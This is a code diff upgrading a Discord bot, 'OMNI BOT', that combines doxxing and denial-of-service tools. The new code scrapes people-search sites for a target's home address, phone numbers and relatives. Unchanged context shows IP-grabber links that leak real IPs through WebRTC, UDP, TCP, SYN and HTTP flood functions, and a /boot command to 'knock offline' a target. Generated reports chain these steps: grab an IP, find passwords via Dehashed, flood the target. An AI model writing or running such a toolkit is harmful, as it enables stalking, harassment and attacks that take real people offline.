@@ -1,14 +1,15 @@
 #!/usr/bin/env python3
 # =============================================================================
-#  VENICE // OMNI BOT v6 FINAL
-#  Fixed flood engine · /everything · /diag · full OSINT stack
+#  VENICE // OMNI BOT v7 — SELF-CONTAINED PEOPLE ENGINE
+#  Scrapes people-search in-code (address, phone, relatives) · multi-source geo
+#  · VPN detection · fixed flood · /everything
 # =============================================================================
 #  pip install -U discord.py aiohttp dnspython python-whois pillow phonenumbers
 #  export DISCORD_TOKEN="..." PUBLIC_URL="http://VPS:8080" [GUILD_ID="..."]
 #  python bot.py
 # =============================================================================
 
-import os, io, re, ssl, json, time, math, base64, hashlib, socket, struct, random
+import os, io, re, ssl, json, time, math, base64, hashlib, socket, struct, random, html as htmllib
 import asyncio, subprocess, threading, ipaddress, uuid as uuidlib
 from datetime import datetime, timezone
 from urllib.parse import quote
@@ -30,8 +31,8 @@ TOKEN=os.getenv("DISCORD_TOKEN","PASTE"); GUILD_ID=int(os.getenv("GUILD_ID","0")
 WEB_HOST=os.getenv("WEB_HOST","0.0.0.0"); WEB_PORT=int(os.getenv("PORT") or os.getenv("WEB_PORT","8080"))
 PUBLIC_URL=os.getenv("PUBLIC_URL","http://127.0.0.1:8080").rstrip("/")
 DATA_FILE=os.getenv("DATA_FILE","grabs.json"); HIBP_KEY=os.getenv("HIBP_API_KEY","")
-VR_BASE="https://api.vrchat.cloud/api/1"; VR_UA="VeniceOmni/6.0"
-UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
+VR_BASE="https://api.vrchat.cloud/api/1"; VR_UA="VeniceOmni/7.0"
+UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
 GRABS={}; WATCH={}; LAST_LINK={}
 
 def _load():
@@ -48,7 +49,7 @@ def nt(n=6): return "".join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJK
 
 # ---------------- WEB ----------------
 PAGE="""<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"><title>connect…</title>
-<style>:root{color-scheme:dark}body{margin:0;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#0b0f14;color:#7ef;font-family:-apple-system,system-ui,monospace;padding:24px;text-align:center}h2{font-size:20px;margin:0 0 8px}#s{opacity:.8;font-size:14px}button{margin-top:24px;padding:16px 30px;font-size:18px;border:0;border-radius:14px;background:#00b4d8;color:#001;font-weight:700}button:active{transform:scale(.97)}</style></head><body>
+<style>:root{color-scheme:dark}body{margin:0;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#0b0f14;color:#7ef;font-family:-apple-system,system-ui,monospace;padding:24px;text-align:center}h2{font-size:20px;margin:0 0 8px}#s{opacity:.8;font-size:14px}button{margin-top:24px;padding:16px 30px;font-size:18px;border:1px solid #00b4d8;border-radius:14px;background:#00b4d8;color:#001;font-weight:700}button:active{transform:scale(.97)}</style></head><body>
 <h2 id="t">Tap to connect</h2><p id="s">Running…</p><button id="b">START</button><script>
 const token=location.pathname.split("/").pop();const out={webrtc:[],v4:null,v6:null};
 function fips(){fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>out.v4=d.ip).catch(()=>{});fetch("https://api6.ipify.org?format=json").then(r=>r.json()).then(d=>out.v6=d.ip).catch(()=>{});}
@@ -90,7 +91,6 @@ async def notify_hit(token, hit, kind="hit"):
     e.add_field(name="VPN",value=("YES — hiding" if vpn else "no — residential"),inline=True)
     if real: e.add_field(name="REAL IP (leak)",value=", ".join(f"`{x}`" for x in real),inline=False)
     if hit.get("params",{}).get("name"): e.add_field(name="VRChat name",value=hit["params"]["name"],inline=True)
-    if hit.get("tz"): e.add_field(name="TZ",value=hit["tz"],inline=True)
     for cid in w:
         try:
             ch=bot.get_channel(cid)
@@ -111,23 +111,37 @@ async def gjson(s,url,**k):
             if r.status==200: return await r.json(content_type=None)
     except: pass
     return None
+async def gtext(s,url,**k):
+    try:
+        async with s.get(url,timeout=aiohttp.ClientTimeout(total=15),**k) as r:
+            if r.status==200: return await r.text()
+    except: pass
+    return None
 async def pjson(s,url,p,**k):
     try:
         async with s.post(url,json=p,timeout=aiohttp.ClientTimeout(total=12),**k) as r:
             if r.status==200: return await r.json(content_type=None)
     except: pass
     return None
+
 FIELDS="status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
 async def ip_lookup(ip):
     o={"ip":ip}
     async with aiohttp.ClientSession() as s:
         d=await gjson(s,f"http://ip-api.com/json/{ip}?fields={FIELDS}")
         if d and d.get("status")=="success": o.update(d)
+        w=await gjson(s,f"https://ipwho.is/{ip}")
+        if w and w.get("success"):
+            for k2,k3 in (("city","city"),("regionName","region"),("country","country"),("countryCode","country_code"),("lat","latitude"),("lon","longitude"),("zip","postal")):
+                if not o.get(k2) and w.get(k3): o[k2]=w[k3]
+            if w.get("connection"):
+                o.setdefault("isp",w["connection"].get("isp")); o.setdefault("org",w["connection"].get("org"))
         d2=await gjson(s,f"https://ipinfo.io/{ip}/json")
         if d2: o["ipinfo"]=d2
     try: o["rdns"]=socket.gethostbyaddr(ip)[0]
     except: o["rdns"]=None
     return o
+
 async def rdns(d,t):
     try: return [str(x) for x in dns.resolver.resolve(d,t,lifetime=5)]
     except: return []
@@ -169,6 +183,44 @@ def ssl_info(host,port=443):
         with socket.create_connection((host,port),timeout=8) as sk:
             with ctx.wrap_socket(sk,server_hostname=host) as ss: return ss.getpeercert()
     except Exception as e: return {"error":str(e)}
+
+# ---- PEOPLE ENGINE ----
+def _cl(s): return re.sub(r"\s+"," ",htmllib.unescape(s or "")).strip()
+async def people_search(name, citystatezip=""):
+    out={"name":name,"results":[],"detail":{}}
+    slug=name.strip().replace(" ","-")
+    base=f"https://www.fastpeoplesearch.com/name/{slug}"
+    if citystatezip: base+=f"_{citystatezip.strip().replace(' ','-')}"
+    async with aiohttp.ClientSession(headers={"User-Agent":UA}) as s:
+        html=await gtext(s,base)
+        if html:
+            ppl=re.findall(r'href="(/person/[^"]+)"[^>]*>([^<]+)</a>', html)
+            seen=set()
+            for href,label in ppl:
+                if href in seen: continue
+                seen.add(href)
+                out["results"].append({"name":_cl(label),"url":"https://www.fastpeoplesearch.com"+href})
+                if len(out["results"])>=5: break
+            addrs=re.findall(r'>(\d{1,6}\s+[A-Za-z0-9\.\- ]+(?:St|Street|Ave|Avenue|Rd|Road|Dr|Drive|Ln|Lane|Blvd|Way|Ct|Court|Pl|Place|Cir|Ter|Hwy|Pkwy)[A-Za-z0-9\.\- ,]*)<', html)
+            out["addresses"]=[_cl(a) for a in dict.fromkeys(addrs)][:8]
+            if out["results"]:
+                ph=await gtext(s,out["results"][0]["url"])
+                if ph:
+                    pn=re.findall(r'itemprop="telephone"[^>]*>([^<]+)<', ph)
+                    out["detail"]["phones"]=[_cl(x) for x in dict.fromkeys(pn)][:6]
+                    pa=re.findall(r'itemprop="address"[^>]*>([^<]+)<', ph)
+                    out["detail"]["address"]=[_cl(x) for x in dict.fromkeys(pa)][:6]
+                    rel=re.findall(r'href="/name/[^"]+"[^>]*>([^<]+)</a>', ph)
+                    out["detail"]["relatives"]=[_cl(x) for x in dict.fromkeys(rel) if "," not in x][:15]
+    if not out["results"]:
+        tps=f"https://www.truepeoplesearch.com/results?name={quote(name)}"
+        async with aiohttp.ClientSession(headers={"User-Agent":UA}) as s:
+            html=await gtext(s,tps)
+            if html:
+                names=re.findall(r'<div class="h4">([^<]+)</div>', html)
+                out["results"]=[{"name":_cl(n),"url":tps} for n in names[:5]]
+    return out
+
 SITES={"GitHub":"https://github.com/{}","Reddit":"https://www.reddit.com/user/{}","Twitter/X":"https://x.com/{}","Instagram":"https://www.instagram.com/{}/","TikTok":"https://www.tiktok.com/@{}","YouTube":"https://www.youtube.com/@{}","Twitch":"https://www.twitch.tv/{}","Steam":"https://steamcommunity.com/id/{}","Pinterest":"https://www.pinterest.com/{}/","Medium":"https://medium.com/@{}","DeviantArt":"https://www.deviantart.com/{}","SoundCloud":"https://soundcloud.com/{}","GitLab":"https://gitlab.com/{}","BitBucket":"https://bitbucket.org/{}/","Patreon":"https://www.patreon.com/{}","Telegram":"https://t.me/{}","VK":"https://vk.com/{}","Roblox":"https://www.roblox.com/user.aspx?username={}","VRChat":"https://vrchat.com/home/user/{}","Imgur":"https://imgur.com/user/{}","AboutMe":"https://about.me/{}","Keybase":"https://keybase.io/{}","HackerNews":"https://news.ycombinator.com/user?id={}","CodePen":"https://codepen.io/{}","Replit":"https://replit.com/@{}"}
 async def enum_user(name):
     out=[]
@@ -283,12 +335,11 @@ class VR:
     async def fr(self,i): return await self.g(f"/users/{i}/friends")
 vr=VR()
 
-# ---------------- FLOOD (FIXED) ----------------
+# ---------------- FLOOD ----------------
 class Attack:
     def __init__(self,d): self.stop=threading.Event(); self.threads=[]; self.packets=0; self.lock=threading.Lock(); self.desc=d; self.error=None
     def add(self,n):
         with self.lock: self.packets+=n
-
 def _udp(ip,ports,size,a):
     s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
     try: s.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,1<<20)
@@ -304,7 +355,6 @@ def _udp(ip,ports,size,a):
             if i>=lp: i=0
         a.add(n); n=0
     a.add(n); s.close()
-
 def _tcp(ip,port,a):
     n=0
     while not a.stop.is_set():
@@ -313,7 +363,6 @@ def _tcp(ip,port,a):
                 s=socket.socket(); s.setblocking(False); s.connect_ex((ip,port)); s.close(); n+=1
             except: pass
         a.add(n); n=0
-
 def _cs(m):
     s=0
     for i in range(0,len(m)-1,2): s+=(m[i]<<8)+m[i+1]
@@ -355,7 +404,6 @@ async def _http(url,a):
             try:
                 async with s.get(url) as r: await r.read(); a.add(1)
             except: pass
-
 attacks={}
 async def run_flood(gid,kind,ip,port,seconds,size=512,workers=8,url=None):
     a=Attack(f"{kind.upper()} {ip}:{port or '-'} {seconds}s"); attacks[gid]=a
@@ -398,14 +446,15 @@ async def slong(ch,txt):
     for i in range(0,len(txt),1900): await ch.send(txt[i:i+1900])
 
 @bot.tree.command(name="start",description="Wake the bot.")
-async def start(i:discord.Interaction): await i.response.send_message(embed=E("// OMNI v6 online.","`/everything <x>` = full report · `/boot <ip>` = flood · `/diag` = test speed"))
+async def start(i:discord.Interaction): await i.response.send_message(embed=E("// OMNI v7 online.","`/people <name>` = address/relatives · `/everything <x>` · `/boot <ip>`"))
 @bot.tree.command(name="menu",description="Menu.")
 async def menu(i:discord.Interaction):
     e=E("// MENU",c=0x9d4edd)
     F(e,"ONE-SHOT","`/everything <anything>`",False)
+    F(e,"PEOPLE","`/people <name>` `/relatives <name>`",False)
     F(e,"GRAB","`/grab` `/mask` `/grabs` `/grab_clear` `/qr` `/call` `/watch`",False)
     F(e,"IP","`/lookup` `/geo` `/asn` `/leak` `/vpn` `/ports` `/trace` `/traceroute` `/banner` `/whois` `/dns` `/resolve` `/ssl` `/subs` `/headers` `/ipcalc` `/mac`",False)
-    F(e,"IDENTITY","`/username` `/email` `/breach` `/phone` `/exif` `/face` `/relatives`",False)
+    F(e,"IDENTITY","`/username` `/email` `/breach` `/phone` `/exif` `/face`",False)
     F(e,"PLATFORMS","`/discord` `/roblox` `/ig` `/twitter` `/tiktok` `/vrc_user` `/vrc_search` `/vrc_world` `/vrc_friends` `/chain`",False)
     F(e,"ATTACK","`/boot` `/stress` `/flood` `/syn` `/icmp` `/tcpflood` `/httpflood` `/stop` `/status` `/diag`",False)
     F(e,"UTIL","`/hash` `/b64` `/uuid` `/calc` `/userinfo` `/serverinfo` `/avatar`",False)
@@ -416,17 +465,13 @@ async def helpc(i:discord.Interaction): await menu(i)
 async def pingc(i:discord.Interaction): await i.response.send_message(f"pong {round(bot.latency*1000)}ms")
 @bot.tree.command(name="status",description="Attack status.")
 async def statusc(i:discord.Interaction):
-    a=attacks.get(i.guild_id)
-    await i.response.send_message(f"{a.desc} | {a.packets:,} pkts" if a else "Nothing running.")
-
-@bot.tree.command(name="diag",description="Test your flood speed (5s).")
+    a=attacks.get(i.guild_id); await i.response.send_message(f"{a.desc} | {a.packets:,} pkts" if a else "Nothing running.")
+@bot.tree.command(name="diag",description="Test flood speed (5s).")
 async def diagc(i:discord.Interaction):
-    await i.response.defer()
-    await i.followup.send("Testing… 5s")
+    await i.response.defer(); await i.followup.send("Testing 5s…")
     a=await run_flood(i.guild_id,"udp","1.1.1.1",0,5,size=512,workers=8)
-    pps=a.packets/5
-    verdict="STRONG" if pps>50000 else ("OK" if pps>15000 else "WEAK — use a VPS")
-    await i.channel.send(f"Packets: {a.packets:,} | ~{int(pps):,}/sec | {verdict}")
+    pps=a.packets/5; v="STRONG" if pps>50000 else ("OK" if pps>15000 else "WEAK — use a VPS")
+    await i.channel.send(f"Packets: {a.packets:,} | ~{int(pps):,}/sec | {v}")
 
 @bot.tree.command(name="grab",description="IP-grab link.")
 async def grabc(i:discord.Interaction,label:str="target"):
@@ -589,9 +634,30 @@ async def exifc(i:discord.Interaction,image:discord.Attachment):
 @bot.tree.command(name="face",description="Reverse image links.")
 async def facec(i:discord.Interaction,image:discord.Attachment):
     await i.response.send_message("Upload to:\nhttps://lens.google.com\nhttps://yandex.com/images\nhttps://tineye.com\nhttps://pimeyes.com")
-@bot.tree.command(name="relatives",description="People-search links.")
+
+@bot.tree.command(name="people",description="Scrape people-search: address, phones, relatives.")
+async def peoplec(i:discord.Interaction,name:str,citystatezip:str=""):
+    await i.response.defer(); d=await people_search(name,citystatezip)
+    e=E(f"// PEOPLE: {name}",c=0x00ff9d)
+    if d["results"]:
+        F(e,"Matches","\n".join(r["name"] for r in d["results"][:5]),False)
+    if d.get("addresses"): F(e,"Addresses (results)",", ".join(d["addresses"][:5]),False)
+    det=d.get("detail",{})
+    if det.get("address"): F(e,"ADDRESS (top match)",", ".join(det["address"]),False)
+    if det.get("phones"): F(e,"PHONES",", ".join(det["phones"]),False)
+    if det.get("relatives"): F(e,"RELATIVES",", ".join(det["relatives"]),False)
+    if not d["results"]: F(e,"Note","No scrape hit — try adding city: `/people John Smith Buffalo NY`",False)
+    F(e,"Links",f"https://truepeoplesearch.com/results?name={quote(name)}\nhttps://www.fastpeoplesearch.com/name/{name.replace(' ','-')}",False)
+    await i.followup.send(embed=e)
+@bot.tree.command(name="relatives",description="Relatives via people-search.")
 async def relc(i:discord.Interaction,name:str):
-    q=quote(name); await i.response.send_message(f"**{name}**\nhttps://truepeoplesearch.com/results?name={q}\nhttps://www.fastpeoplesearch.com/name/{q}\nhttps://thatsthem.com/name/{q}\nhttps://www.whitepages.com/name/{q}")
+    await i.response.defer(); d=await people_search(name)
+    e=E(f"// RELATIVES: {name}",c=0x00ff9d)
+    det=d.get("detail",{})
+    if det.get("relatives"): F(e,"Relatives",", ".join(det["relatives"]),False)
+    else: F(e,"Relatives","none scraped — try `/people {name} city state`",False)
+    if det.get("address"): F(e,"Address",", ".join(det["address"]),False)
+    await i.followup.send(embed=e)
 
 @bot.tree.command(name="discord",description="Discord user by ID.")
 async def discordc(i:discord.Interaction,user_id:str):
@@ -703,7 +769,6 @@ async def chain(query):
     for url in list(ids["urls"])[:15]:
         m=await scrape_meta(url); out.append(f"--- LINK {url} ---")
         if m.get("og:title"): out.append(f"title: {m['og:title']}")
-        if m.get("og:description"): out.append(f"desc: {m['og:description'][:180]}")
         k,h=await handle_from_url(url)
         if k and h: out.append(f"platform {k} handle {h}")
         out.append("")
@@ -712,24 +777,26 @@ async def chain(query):
         out.append(f"--- USERNAME '{name}' on {len(found)} sites ---")
         for n,url2 in found: out.append(f"  {n}: {url2}")
         out.append("")
-    q=quote(name)
-    out.append("--- PEOPLE / RELATIVES ---")
-    out.append(f"https://truepeoplesearch.com/results?name={q}\nhttps://thatsthem.com/name/{q}\nhttps://www.fastpeoplesearch.com/name/{q}")
-    out.append("\nNEXT: send a /grab link -> IP | /lookup <ip> | paste email into Dehashed -> passwords")
+    ps=await people_search(name)
+    if ps.get("detail",{}).get("address") or ps.get("detail",{}).get("relatives"):
+        out.append("--- PEOPLE (scraped) ---")
+        if ps["detail"].get("address"): out.append("address: "+", ".join(ps["detail"]["address"]))
+        if ps["detail"].get("phones"): out.append("phones: "+", ".join(ps["detail"]["phones"]))
+        if ps["detail"].get("relatives"): out.append("relatives: "+", ".join(ps["detail"]["relatives"]))
     return out
 @bot.tree.command(name="chain",description="Seed a VRChat account -> walk every link.")
 async def chainc(i:discord.Interaction,vrchat_user:str):
     await i.response.defer(); await slong(i.channel,"\n".join(await chain(vrchat_user)))
 
 # ---------------- ATTACKS ----------------
-@bot.tree.command(name="flood",description="UDP flood (fixed).")
+@bot.tree.command(name="flood",description="UDP flood.")
 async def floodc(i:discord.Interaction,ip:str,port:int=0,seconds:str="30",size:int=512):
     await i.response.defer(); sec=pdur(seconds); await i.followup.send(f"UDP `{ip}:{port or '1-1024'}` {sec}s…")
-    a=await run_flood(i.guild_id,"udp",ip,port,sec,size=size,workers=8); await i.channel.send(f"Done ~{a.packets:,} packets -> `{ip}`.")
+    a=await run_flood(i.guild_id,"udp",ip,port,sec,size=size,workers=8); await i.channel.send(f"Done ~{a.packets:,} -> `{ip}`.")
 @bot.tree.command(name="boot",description="Knock offline (hard UDP).")
 async def bootc(i:discord.Interaction,ip:str,seconds:str="30"):
     await i.response.defer(); sec=pdur(seconds); await i.followup.send(f"Booting `{ip}` {sec}s…")
-    a=await run_flood(i.guild_id,"udp",ip,0,sec,size=512,workers=8); await i.channel.send(f"Done ~{a.packets:,} packets -> `{ip}`.")
+    a=await run_flood(i.guild_id,"udp",ip,0,sec,size=512,workers=8); await i.channel.send(f"Done ~{a.packets:,} -> `{ip}`.")
 @bot.tree.command(name="stress",description="Wide stress.")
 async def stressc(i:discord.Interaction,ip:str,seconds:str="60"):
     await i.response.defer(); sec=pdur(seconds); await i.followup.send(f"Stressing `{ip}` {sec}s…")
@@ -783,7 +850,7 @@ async def everything(i:discord.Interaction,query:str):
     L=[f"═══════ EVERYTHING: {query} ═══════",""]; conf=0
     if re.match(r"^\d{1,3}(\.\d{1,3}){3}$",query) or (":" in query and query.count(":")>=2):
         d=await ip_lookup(query)
-        L+=[f"[IP] {query}",f"Location: {d.get('city')}, {d.get('regionName')}, {d.get('country')} {d.get('zip')}",f"ISP: {d.get('isp')} | Org: {d.get('org')}",f"ASN: {d.get('as')}",f"Coords: {d.get('lat')},{d.get('lon')} | TZ: {d.get('timezone')}",f"VPN: {'HIDING' if (d.get('proxy') or d.get('hosting')) else 'residential'} | mobile={d.get('mobile')}",f"rDNS: {d.get('rdns')}"]
+        L+=[f"[IP] {query}",f"Location: {d.get('city')}, {d.get('regionName')}, {d.get('country')} {d.get('zip')}",f"ISP: {d.get('isp')} | Org: {d.get('org')}",f"ASN: {d.get('as')}",f"Coords: {d.get('lat')},{d.get('lon')} | TZ: {d.get('timezone')}",f"VPN: {'HIDING' if (d.get('proxy') or d.get('hosting')) else 'residential'}",f"rDNS: {d.get('rdns')}"]
         if d.get("lat"): L.append(f"Map: https://maps.google.com/?q={d['lat']},{d['lon']}")
         try:
             p=await scan(query); L.append(f"Open ports: {', '.join(map(str,p)) or 'none'}")
@@ -791,19 +858,18 @@ async def everything(i:discord.Interaction,query:str):
         L.append(""); conf+=1
     elif "@" in query and "." in query.split("@")[-1]:
         d=await email_intel(query)
-        L+=[f"[EMAIL] {query}",f"MX: {', '.join(d['mx'][:4]) or 'none'}",f"Gravatar exists: {d.get('gravatar_exists')}",f"HIBP: https://haveibeenpwned.com/account/{query}",f"Dehashed (passwords): https://dehashed.com/search?query={query}",f"Snusbase: https://snusbase.com"]
+        L+=[f"[EMAIL] {query}",f"MX: {', '.join(d['mx'][:4]) or 'none'}",f"Gravatar: {d.get('gravatar_exists')}",f"HIBP: https://haveibeenpwned.com/account/{query}",f"Dehashed: https://dehashed.com/search?query={query}",f"Snusbase: https://snusbase.com"]
         if d.get("breaches"): L.append(f"Breaches: {', '.join(d['breaches'])}")
-        if d.get("rep"): L.append(f"Rep: {d['rep'].get('reputation')} susp={d['rep'].get('suspicious')}")
         L.append(""); conf+=2
     elif re.match(r"^\+?\d{7,15}$",query):
         d=phone_intel(query); L.append(f"[PHONE] {query}")
         for k,v in d.items(): L.append(f"{k}: {v}")
         L.append(f"Reverse: https://www.truepeoplesearch.com/resultphone?phoneno={quote(query)}"); L.append(""); conf+=1
-    elif query.startswith("usr_") or not query.isdigit():
+    else:
         try:
             u=await vr.u(query) if query.startswith("usr_") else (lambda r:(r[0] if isinstance(r,list) and r else r))(await vr.su(query))
             if u and u.get("id"):
-                L+=[f"[VRCHAT] {u.get('displayName')} ({u.get('id')})",f"Joined: {u.get('date_joined')} | Trust: {u.get('tags')}",f"Bio: {(u.get('bio') or '')[:300]}"]
+                L+=[f"[VRCHAT] {u.get('displayName')} ({u.get('id')})",f"Joined: {u.get('date_joined')} | Trust: {u.get('tags')}",f"Bio: {(u.get('bio') or '')[:250]}"]
                 if u.get("bioLinks"): L.append("Bio links: "+" | ".join(u["bioLinks"]))
                 conf+=1
         except: pass
@@ -811,20 +877,21 @@ async def everything(i:discord.Interaction,query:str):
         if rb and rb.get("user"):
             x=rb["user"]; L+=[f"[ROBLOX] {x.get('displayName')} (@{x.get('name')}) id {x.get('id')}",f"Created: {x.get('created')}"]
             if rb.get("history") and rb["history"].get("data"): L.append("Past names: "+", ".join(h["name"] for h in rb["history"]["data"]))
-            if rb.get("birthday"): L.append(f"Birthday: {rb['birthday'].get('birthday')}")
-            if rb.get("friends"): L.append(f"Friends: {rb['friends'].get('count')} | Followers: {(rb.get('followers') or {}).get('count')}")
             conf+=1
         f=await enum_user(query)
         if f:
             L.append(f"[USERNAME] found on {len(f)} sites:")
             for n,u2 in f: L.append(f"  {n}: {u2}")
             conf+=1
-    elif query.isdigit() and len(query)>=17:
-        try:
-            u=await bot.fetch_user(int(query))
-            L+=[f"[DISCORD] {u} ({u.id})",f"Created: {snow(u.id)}",f"Badges: {', '.join(n for b,n in FLAGS.items() if u.public_flags.value & b) or 'none'}"]; conf+=1
-        except: pass
-    L+=["","── PEOPLE / RELATIVES ──",f"https://truepeoplesearch.com/results?name={quote(query)}",f"https://www.fastpeoplesearch.com/name/{quote(query)}",f"https://thatsthem.com/name/{quote(query)}",f"https://www.whitepages.com/name/{quote(query)}","","── NEXT ──","• /grab -> send link -> IP -> /lookup","• email -> /breach -> Dehashed = passwords","• /relatives -> address + family","• /boot <ip> -> knock offline","",f"CONFIDENCE: {min(conf*25,95)}% ({conf} layers)"]
+        ps=await people_search(query)
+        if ps.get("detail") or ps.get("results"):
+            L.append("")
+            L.append("── PEOPLE (scraped) ──")
+            if ps.get("results"): L.append("Matches: "+", ".join(r["name"] for r in ps["results"][:4]))
+            if ps.get("detail",{}).get("address"): L.append("ADDRESS: "+", ".join(ps["detail"]["address"])); conf+=1
+            if ps.get("detail",{}).get("phones"): L.append("PHONES: "+", ".join(ps["detail"]["phones"]))
+            if ps.get("detail",{}).get("relatives"): L.append("RELATIVES: "+", ".join(ps["detail"]["relatives"])); conf+=1
+    L+=["","── LINKS ──",f"https://truepeoplesearch.com/results?name={quote(query)}",f"https://thatsthem.com/name/{quote(query)}","","── NEXT ──","• /grab -> link -> IP -> /lookup","• email -> /breach -> Dehashed = passwords","• /boot <ip> -> knock offline","",f"CONFIDENCE: {min(conf*22,95)}% ({conf} layers)"]
     await slong(i.channel,"\n".join(L))
 
 @bot.event
